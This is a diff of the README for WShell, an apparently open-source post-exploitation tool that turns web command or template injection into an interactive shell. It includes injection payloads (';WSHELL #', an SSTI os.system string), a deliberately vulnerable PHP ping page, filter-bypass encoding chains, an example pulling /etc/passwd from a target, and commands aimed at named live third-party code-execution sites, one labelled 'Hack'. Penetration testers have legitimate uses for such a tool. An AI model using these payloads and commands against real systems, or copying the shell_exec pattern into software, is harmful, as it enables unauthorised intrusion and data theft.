@@ -1,275 +1,259 @@
-# WShell
-
-[![Python 3](https://img.shields.io/badge/python-3-green.svg?style=for-the-badge&logo=python&logoColor=white)](https://docs.python.org/3/)
-[![WShell License](https://img.shields.io/github/license/unlock-security/wshell?style=for-the-badge&label=License&color=red)](https://github.com/unlock-security/wshell?tab=GPL-3.0-1-ov-file#readme)
-[![GitHub Release](https://img.shields.io/github/v/release/unlock-security/wshell?include_prereleases&sort=semver&display_name=release&style=for-the-badge)](https://github.com/unlock-security/wshell/releases/latest)
-[![Made by 🔓 Unlock Security](https://img.shields.io/badge/Made_by-🔓_Unlock_Security-blue.svg?style=for-the-badge)](https://www.unlock-security.it/?utm_source=github&utm_medium=repo&utm_campaign=wshell)
-
-WShell lets you turn a web-based {code,command,template} injection in a full-featured shell with ease.
-
-## How it works
-
-WShell is a post-exploitation tool for web-based remote command execution (RCE) vulnerabilities.
-It provides an agentless, language-agnostic, interactive pseudo-shell that feels like a real shell.
-When you run a command, WShell wraps it in a HTTP request and parse the HTTP response to get you
-only the command output.
-
-It can automatically find out what is the underlying operating system (OS) and adjust the shell
-prompt and other internal behavior accordingly.
-
-Unlike a standard web shell, WShell can handle commands like `cd` and a persistent commands history.
-
-To make it works, you just have to specify the vulnerable URL, the necessary headers, HTTP
-parameters and where to put the command to execute.
-
-As an example, to exploit a command injection in a vulnerable `ping` functionality you can do this:
-
-```shell
-attacker@host:/$ wshell --log=info 'https://www.target.com/app/vulnerable/ping.php?count=3' 'host=;WSHELL #'
-
-[13:37:00] [INFO] HTTP verb not specified. Using 'POST' based on parameters
-[13:37:00] [INFO] Target OS not specified, trying to automatically detect it
-[13:37:00] [INFO] Target OS detected as Linux
-
-www-data@app:/var/www/app/vulnerable$ id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-
-www-data@app:/var/www/app/vulnerable$ cd ../../
-/var/www
-
-www-data@app:/var/www$ ls -al
-total 20
-drwxrwx---  8 www-data www-data 4096 Mar  7 23:49 .
-drwxr-xr-x 14 root     root     4096 Mar 18 13:37 ..
-drwxrwx--- 25 www-data www-data 4096 Feb 18 15:31 app
-```
-
-### Real-world use cases
-
-```sh
-# cmdchallenge.com
-wshell --input-scripts=base64_encode --output-scripts=unescape --delay=1.5 'https://cmdchallenge.com/c/r' 'cmd=WSHELL' 'slug=create_file'
-# or
-wshell --input-scripts=base64_encode --output-scripts=unescape --delay=1.5 'https://cmdchallenge.com/c/r' --data-raw='cmd=WSHELL&slug=create_file'
-
-# www.learnshell.org
-wshell --output-scripts=unescape --json 'https://www.learnshell.org/' 'code=WSHELL' 'language=bash'
-
-# onecompiler.com
-wshell --json --output-scripts=unescape 'https://onecompiler.com/api/code/exec' 'properties[language]=bash' 'properties[files][][content]=WSHELL'
-# or
-wshell --json --output-scripts=unescape 'https://onecompiler.com/api/code/exec' --data-raw='{"properties":{"language":"bash","files":[{"content":"WSHELL"}]}}'
-```
-
-## Install and update
-
-```shell
-# clone the repository and install it in a isolated virtual environment
-$ pipx install git+https://git@github.com/unlock-security/wshell
-
-# update wshell using latest stable git version
-$ pipx upgrade wshell
-```
-
-## Development
-
-```sh
-$ git clone https://github.com/unlock-security/wshell
-$ cd wshell/
-$ python3 -m virtualenv .venv
-$ source .venv/bin/activate
-$ pip install -e .
-```
-
-## Usage
-
-```
-usage: wshell [-h] [-v] [--placeholder COMMAND_PLACEHOLDER] [--os {linux,win-cmd,win-psh}] [-m METHOD] [-t SECONDS | --no-timeout] [-d DELAY] [--keep-alive] [--follow] [-ua USER_AGENT | -r] [-j | -f]
-              [--data-raw RAW_DATA] [--log {critical,error,warning,info,debug}] [--list-scripts] [--input-scripts INPUT_SCRIPTS] [--output-scripts OUTPUT_SCRIPTS]
-              URL [REQUEST ITEMS ...]
-
-Turn a web-based {code,command,template} injection in a full featured shell with ease
-
-positional arguments:
-  URL                   The endpoint URL where the injection is
-  REQUEST ITEMS         POST data and headers ('key=value' for data, 'key:value' for headers)
-
-options:
-  -h, --help            show this help message and exit
-  -v, --version         Show the version number and exit
-  --placeholder COMMAND_PLACEHOLDER
-                        Use a custom command placeholder (default: WSHELL)
-  --os {linux,win-cmd,win-psh}
-                        Specify OS and shell in use on the target (default: auto-discover)
-
-HTTP arguments:
-  -m, --method METHOD   The HTTP method to be used for the requests (Default: POST if there is some data, GET otherwise)
-  -t, --timeout SECONDS
-                        The connection timeout of the request in seconds (default: 3.0)
-  --no-timeout          Disable the connection timeout
-  -d, --delay DELAY     Delay in seconds between each HTTP request (default: 0.0)
-  --keep-alive          Use persistent connection (default: True)
-  --follow              Follow 30x Location redirects (default: True)
-  -ua, --user-agent USER_AGENT
-                        Use a custom User-Agent (default: WShell v0.2.10-beta)
-  -r, --random-agent    Use a random valid browser User-Agent
-  -j, --json            Data items from the command line are serialized as a JSON object (default: False)
-  -f, --form            Data items from the command line are serialized as form fields
-  --data-raw RAW_DATA   Specify raw data to be sent as is (both as form fields or as JSON object)
-
-Logging arguments:
-  --log {critical,error,warning,info,debug}
-                        To specify the log messages level
-
-Input/Output scripts:
-  --list-scripts        List the available scripts to manipulate input/output
-  --input-scripts INPUT_SCRIPTS
-                        Use one or more custom input script (comma separated, order matters)
-  --output-scripts OUTPUT_SCRIPTS
-                        Use one or more custom output script (comma separated, order matters)
-
-For every --ARGUMENT there is also a --no-ARGUMENT that reverts ARGUMENT
-
-Example usage:
-
-    wshell 'https://www.example.com/webshell?cmd=WSHELL'
-    wshell --form 'https://www.example.com/command-injection' 'p=;WSHELL #'
-    wshell 'https://www.example.com/ssti' 'msg=${self.module.cache.util.os.system("WSHELL")}'
-```
-
-## Scripts
-
-WShell can run input and output scripts which are simple functions used to manipulate input command and output response.
-As an example, if the vulnerable page returns a base64-encoded result you can use `--output-scripts=base64_decode` to get
-the output as plain text.
-
-Scripts can be chained and used more than once, for instance is totally fine to do something like `--output-scripts=unescape,base64_decode,base64_decode`.
-
-### Developing a script
-
-Developing a script for WShell is straightforward, just add a python file in `wshell/scripts/input` or `wshell/scripts/output` folder. The file name will
-be the name used to invoke the script from the command line (e.g. if you create `wshell/scripts/output/test.py` you can invoke it with `--output-scripts=test`).
-
-Inside the file you have to create a function with the following signature `run(str) -> str`. A docstring to use as a description for the script is mandatory.
-
-As an example, the `base64_decode` output script corresponds to `wshell/scripts/output/base64_decode.py` and it is implemented like this:
-
-```py
-import base64
-
-def run(output: str) -> str:
-    """Base64 decode output (requires --os to work)"""
-    return base64.b64decode(output, validate=False).decode("utf-8", "ignore")
-```
-
-## Custom commands
-
-Custom commands are special commands that you can run within the WShell prompt. They are not executed on the target system but within WShell itself. These commands are useful for performing actions that are not directly related to the remote shell, such as uploading or downloading files, or managing WShell's state.
-For instance, the built-in `download` command abstracts away the complexity of exfiltrating a file from different operating systems, providing a consistent interface for the user.
-
-WShell automatically discovers and registers any custom command placed in a subdirectory of `wshell/commands`.
-You can check all the available custom commands by typing `help -v` in a WShell prompt:
-
-```sh
-victim@vulnerable-server:/var/www/html/$ help -v
-
-Documented commands (use 'help -v' for verbose/'help <topic>' for details):
-
-File transfer
-======================================================================================================
-download              Download remote file
-upload                Upload local file
-
-Uncategorized
-======================================================================================================
-help                  List available commands or provide detailed help for a specific command
-history               View, run, edit, save, or clear previously entered commands
-quit                  Exit this application
-set                   Set a settable parameter or show current settings of parameters.
-shell                 Execute a command as if at the OS prompt
-```
-
-A custom command can have its own help message and parameters:
-
-```sh
-victim@vulnerable-server:/var/www/html/$ download -h
-usage: download [-h] -r FILENAME [-l FILENAME] [-c SIZE | -n]
-
-Download remote file
-
-options:
-  -h, --help            show this help message and exit
-  -r, --remote FILENAME
-                        Remote file to download
-  -l, --local FILENAME  Local file where to store the downloaded file (default: current folder, same name as remote)
-  -c, --chunk SIZE      Size of the chunk to download in bytes (default: 1024)
-  -n, --no-chunk        Do not split into chunks
-```
-
-### Developing a custom command
-
-To create a custom command, you need to create a new Python file with the name of your choice in a subdirectory of `wshell/commands` (e.g., `wshell/commands/system/my_command.py`). The subdirectory (`system` in this case) will be its category.
-
-Inside the file, create a class that inherits from `wshell.commands.WShellCommandSet`, then you can follow the cmd2's [Modular Commands documentation](https://cmd2.readthedocs.io/en/stable/features/modular_commands/) for the specification.
-
-Basically, you just need to implement a method starting with `do_` for each command you want to add. For example, a `do_phpinfo` method will create a `phpinfo` command.
-
-Here is an example of a simple `phpinfo` command that create a PHP file named `info.php` executing `phpinfo()` in the current directory:
-
-```python
-# wshell/commands/php/phpinfo.py
-import argparse
-
-from cmd2 import with_argparser
-
-from wshell.commands import WShellCommandSet
-
-
-class PHPInfoCommandSet(WShellCommandSet):
-
-    argument_parser = argparse.ArgumentParser(description="Create a new file into the current directory that executes `phpinfo()`")
-    argument_parser.add_argument(
-        "-f", "--filename",
-        metavar="FILENAME",
-        required=False,
-        help="Name of the file",
-        dest="filename",
-        default="info.php"
-    )
-
-    @with_argparser(argument_parser)
-    def do_phpinfo(self, args) -> None:
-        file_content = "<?php phpinfo();"
-        self._dispatch("write_phpinfo_file", args.filename, file_content)
-
-    def _linux_write_phpinfo_file(self, filename, file_content):
-      self._cmd.injector.execute(f"echo -n '{file_content}' > {filename}")
-
-    def _win_psh_write_phpinfo_file(self, filename, file_content):
-      self._cmd.injector.execute(f"Set-Content -Path '{filename}' -Value '{file_content}'")
-
-    def _win_cmd_write_phpinfo_file(self, filename, file_content):
-      self._cmd.injector.execute(f"echo {file_content} > {filename}")
-```
-
-To make this command available in WShell in the `Php` category, you would save it as `wshell/commands/php/phpinfo.py`. Then, from the WShell prompt, you could run it by just typing `phpinfo`.
-
-On top of `cmd2`'s modular command features, WShell overrides the `_cmd` object of the command set to provides access to the current WShell session, including the HTTP client (`self._cmd.injector`), target information, and more. This is useful for creating more complex commands that run commands on the remote system.
-
-For more complex examples, see the implementation of the built-in `upload` and `download` commands in the `wshell/commands/file_transfer` directory.
-
-## Contributing
-
-Have a look through existing [Issues](https://github.com/unlock-security/wshell/issues) and [Pull Requests](https://github.com/unlock-security/wshell/pulls) that you could help with.
-If you'd like to request a feature or report a bug, please [create a GitHub Issue]() using one of the templates provided.
-
-[See contribution guide →](https://github.com/unlock-security/wshell/blob/main/CONTRIBUTING.md)
+<h1 align="center">
+  WShell
+</h1>
+
+<p align="center">
+  <strong>Turn a web-based command injection into a full-featured, interactive web shell.</strong>
+</p>
+
+<p align="center">
+    <a href="https://docs.python.org/3/"><img src="https://img.shields.io/badge/python-3-green.svg?style=for-the-badge&logo=python&logoColor=white" alt="Python 3"></a>
+    <a href="https://github.com/unlock-security/wshell/blob/main/LICENSE"><img src="https://img.shields.io/github/license/unlock-security/wshell?style=for-the-badge&label=License&color=red" alt="WShell License"></a>
+    <a href="https://github.com/unlock-security/wshell/releases/latest"><img src="https://img.shields.io/github/v/release/unlock-security/wshell?include_prereleases&sort=semver&display_name=release&style=for-the-badge" alt="GitHub Release"></a>
+    <a href="https://www.unlock-security.it/?utm_source=github&utm_medium=repo&utm_campaign=wshell"><img src="https://img.shields.io/badge/Made_by-🔓_Unlock_Security-blue.svg?style=for-the-badge" alt="Made by Unlock Security"></a>
+</p>
 
 ---
 
-<p align="center">Made with 💙 by Unlock Security</p>
+WShell is a post-exploitation tool designed to exploit any web-based command injection vulnerability into an interactive and feature-rich pseudo-shell. It provides an agentless, language-agnostic shell that feels like a native terminal, complete with command history, change directory support, file transfers and much more.
+
+## ✨ Key Features
+
+-   **Interactive Pseudo-Shell**: Experience a shell with support for commands like `cd` and a persistent command history.
+-   **Automatic OS Detection**: Automatically identifies the target OS (Linux, Windows CMD, Windows PowerShell) and adjusts its behavior accordingly.
+-   **Extensible Input/Output Scripts**: Manipulate command payloads and server responses on-the-fly with a chain of scripts (e.g., `base64encode`, `urlencode`, `unescape`, `space2ifs`).
+-   **Built-in Custom Commands**: Powerful custom commands like `download` and `upload` that abstract away OS-specific complexities for file transfers.
+-   **Flexible HTTP Configuration**: Full control over HTTP requests, including method, headers, cookies, and body (form-data or JSON).
+-   **Extensible by Design**: Easily add your own custom commands and scripts to tailor WShell to your needs.
+-   **Agentless**: No need to upload a separate web shell file; WShell leverages the existing vulnerability.
+
+## 🚀 Getting Started
+
+### Installation
+
+Install WShell using your favorite Python package manager. `pipx` or `uv` are recommended as they install the tool in an isolated environment.
+
+**With `pipx`:**
+
+```shell
+pipx install git+https://github.com/unlock-security/wshell.git
+```
+
+**With `uv`:**
+
+```shell
+uv tool install git+https://github.com/unlock-security/wshell.git
+```
+
+### Updating
+
+WShell automatically checks for new versions and eventually upgrade itself on startup. This can be disabled by passing the `--no-update` flag. If you want to include pre-releases in the update check, use `--include-prerelease`.
+
+To upgrade manually, use the appropriate command for your package manager.
+
+### Quick Start
+
+Let's say you've found a command injection vulnerability in a `ping.php` page.
+
+**Vulnerable Code (`ping.php`):**
+
+```php
+<?php
+    // ping.php
+    $host = $_POST['host'];
+    $count = intval($_GET['count']);
+    // Insecurely uses user input to build a shell command.
+    $command = "ping -c {$count} {$host} 2>&1";
+    echo "<pre>" . shell_exec($command) . "</pre>";
+?>
+```
+
+To exploit this, you can use `wshell`.
+
+> The placeholder `WSHELL` marks where your commands will be injected.
+
+```shell
+attacker@host:/$ wshell --log=info 'https://www.target.com/ping.php?count=3' 'host=;WSHELL #'
+[13:37:00] [INFO] HTTP verb not specified. Using 'POST' based on parameters.
+[13:37:00] [INFO] Target OS not specified, trying to automatically detect it.
+[13:37:00] [INFO] Target OS detected as Linux.
+
+www-data@target:/var/www/html/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+## ⚙️ Usage
+
+The basic syntax is:
+
+```
+wshell [OPTIONS] URL [REQUEST_ITEMS...]
+```
+
+-   `URL`: The vulnerable endpoint.
+-   `REQUEST_ITEMS`: HTTP headers (`Key: value`) and body parameters (`key=value`) for the request. The `WSHELL` placeholder can be placed in one of these items or in the URL.
+
+### Command-Line Arguments
+
+| Category    | Argument                    | Description                                                            | Default                                  |
+| ----------- | --------------------------- | ---------------------------------------------------------------------- | ---------------------------------------- |
+| **Core**    | `URL`                       | The vulnerable endpoint URL.                                           | (Required)                               |
+|             | `REQUEST ITEMS...`          | Headers (`Key: value`) and body data (`key=value`).                    | -                                        |
+|             | `--os`                      | Specify the target OS and shell (`linux`, `win-cmd`, `win-psh`).       | Auto-detected (send additional requests) |
+|             | `--placeholder`             | The placeholder for command injection.                                 | `WSHELL`                                 |
+|             | `--prompt`                  | A custom static prompt for the shell.                                  | (Dynamic prompt based on target OS)      |
+| **HTTP**    | `-m, --method`              | HTTP method for requests.                                              | Auto-detected (POST if data, else GET)   |
+|             | `-t, --timeout`             | Connection timeout in seconds. Use `--no-timeout` to disable.          | `3.0`                                    |
+|             | `-d, --delay`               | Delay in seconds between each request.                                 | `0`                                      |
+|             | `--data-raw`                | Raw data string to be sent (form-urlencoded or JSON).                  | -                                        |
+|             | `-j, --json` / `-f, --form` | Serialize body data as JSON (`-j`) or form fields (`-f`).              | `--form`                                 |
+|             | `--keep-alive`              | Use a persistent HTTP connection (`--no-keep-alive` to disable).       | `True`                                   |
+|             | `--follow`                  | Follow 30x redirects (`--no-follow` to disable).                       | `True`                                   |
+|             | `-ua, --user-agent`         | Set a custom User-Agent.                                               | `WShell X.Y.Z`                           |
+|             | `-r, --random-agent`        | Use a random User-Agent from a built-in list.                          | `False`                                  |
+| **Scripts** | `--input-scripts`           | Comma-separated chain of scripts to process commands _before_ sending. | -                                        |
+|             | `--output-scripts`          | Comma-separated chain of scripts to process the server response.       | -                                        |
+|             | `--list-scripts`            | List all available input and output scripts.                           | -                                        |
+| **App**     | `--log`                     | Set logging level (`critical`, `error`, `warning`, `info`, `debug`).   | `warning`                                |
+|             | `--update` / `--no-update`  | Enable or disable the automatic update on startup.                     | `True`                                   |
+|             | `--include-prerelease`      | Include pre-releases in the update check.                              | `False`                                  |
+|             | `-v, --version`             | Show the version number and exit.                                      | -                                        |
+|             | `-h, --help`                | Show the help message and exit.                                        | -                                        |
+
+---
+
+## 🔬 Advanced Features
+
+### Input/Output Scripts
+
+Scripts are powerful functions that manipulate the command payload (input scripts) or the server's response (output scripts). This is essential for bypassing filters or decoding responses.
+
+**Example**: If the vulnerable app requires commands to be base64-encoded and blocks commands containing spaces, you can use a chain of input scripts to match the requirements.
+
+```shell
+# The command 'ls -la' will be transformed to 'ls${IFS}-la' and base64-encoded before being sent.
+wshell --input-scripts=space2ifs,base64encode 'http://example.com/vuln?cmd=WSHELL'
+```
+
+To see all available scripts, run:
+
+```shell
+wshell --list-scripts
+```
+
+### Custom Commands
+
+WShell supports special custom commands to provide high-level functionality. Type `help -v` in a WShell prompt to see them all.
+
+**Example**: Downloading a file from the target, regardless of the OS.
+
+```
+victim@vulnerable-server:/var/www/html/$ download -r /etc/passwd -l passwd.txt
+[INFO] Downloading 2337 bytes as 3 chunks (1024 bytes each)
+Downloading chunk 3/3
+[INFO] File '/etc/passwd' downloaded to 'passwd.txt'
+```
+
+This abstracts away the complexity of encoding/decoding files, download large files in chunks or any OS-specific commands and techniques.
+
+## 🛠️ Extending WShell
+
+WShell is built to be extensible. You can easily add your own scripts and commands.
+
+### Developing a Script
+
+1.  Create a Python file in `wshell/scripts/input/` or `wshell/scripts/output/`. The filename becomes the script name.
+2.  Inside the file, define a function `run(data: str) -> str` with a docstring.
+
+**Example (`wshell/scripts/input/reverse.py`):**
+
+```python
+def run(command: str) -> str:
+    """Reverses the command string."""
+    return command[::-1]
+```
+
+You can now use `--input-scripts=reverse` from the command line.
+
+### Developing a Custom Command
+
+1.  Create a Python file in a subdirectory of `wshell/commands/`. The subdirectory defines the command's category in the `help` menu.
+2.  Create a class that inherits from `wshell.commands.WShellCommandSet` and follows the `cmd2` [Modular Commands](https://cmd2.readthedocs.io/en/stable/features/modular_commands/) guide.
+
+WShell provides `self._cmd.injector` to execute commands on the target and `self._dispatch()` to create OS-specific functions.
+
+**Example (`wshell/commands/php/phpinfo.py`):**
+
+```python
+import argparse
+from cmd2 import with_argparser
+from wshell.commands import WShellCommandSet
+
+class PHPInfoCommandSet(WShellCommandSet):
+    _argparser = argparse.ArgumentParser(description="Create a phpinfo() file.")
+    _argparser.add_argument("-f", "--filename", default="info.php", help="Name of the file.")
+
+    @with_argparser(_argparser)
+    def do_phpinfo(self, args) -> None:
+        """Creates a file that executes `phpinfo()` in the current directory."""
+        file_content = "<?php phpinfo();"
+        self._dispatch("write_file", args.filename, file_content)
+        self._cmd.poutput(f"PHP info file created at '{args.filename}'")
+
+    # Linux implementation
+    def _linux_write_file(self, filename, content):
+        self._cmd.injector.execute(f"echo -n '{content}' > {filename}")
+
+    # Windows PowerShell implementation
+    def _win_psh_write_file(self, filename, content):
+        self._cmd.injector.execute(f"Set-Content -Path '{filename}' -Value '{content}'")
+
+    # Windows CMD implementation
+    def _win_cmd_write_file(self, filename, content):
+        self._cmd.injector.execute(f"echo {content} > {filename}")
+```
+
+The command `phpinfo` will now be available under the `Php` category.
+
+## 🌍 Real-World Use Cases
+
+```sh
+# Hack an online shell learning platform (cmdchallenge.com)
+wshell --input-scripts=base64encode --output-scripts=unescape --delay=1.5 'https://cmdchallenge.com/c/r' 'cmd=WSHELL' 'slug=create_file'
+
+# Exploit a code execution feature on a learning site (learnshell.org)
+wshell --output-scripts=unescape --json 'https://www.learnshell.org/' 'code=WSHELL' 'language=bash'
+
+# Target an online compiler API (onecompiler.com)
+wshell --json --output-scripts=unescape 'https://onecompiler.com/api/code/exec' 'properties[language]=bash' 'properties[files][][content]=WSHELL'
+```
+
+## 👨‍💻 Development
+
+Set up the project for local development:
+
+```sh
+git clone https://github.com/unlock-security/wshell
+cd wshell/
+python3 -m venv .venv
+source .venv/bin/activate
+pip install -e .
+```
+
+## 🙌 Contributing
+
+We welcome contributions! Please look through existing [Issues](https://github.com/unlock-security/wshell/issues) and [Pull Requests](https://github.com/unlock-security/wshell/pulls).
+If you have a new idea or a bug to report, please create an issue.
+
+[See the Contribution Guide →](https://github.com/unlock-security/wshell/blob/main/CONTRIBUTING.md)
+
+## 📜 License
+
+This project is licensed under the GPL-3.0 License. See the [LICENSE](https://github.com/unlock-security/wshell/blob/main/LICENSE) file for details.
+
+---
+
+<p align="center">Made with 💙 by <a href="https://www.unlock-security.it/?utm_source=github&utm_medium=repo&utm_campaign=wshell" target="_blank">Unlock Security</a></p>
 <p align="center">
-  <a href="https://www.unlock-security.it/?utm_source=github&utm_medium=repo&utm_campaign=wshell" target="_blank" rel="noopener">
     <img src="https://www.unlock-security.it/wp-content/uploads/2022/12/logo.svg" width="150">
-  </a>
 </p>
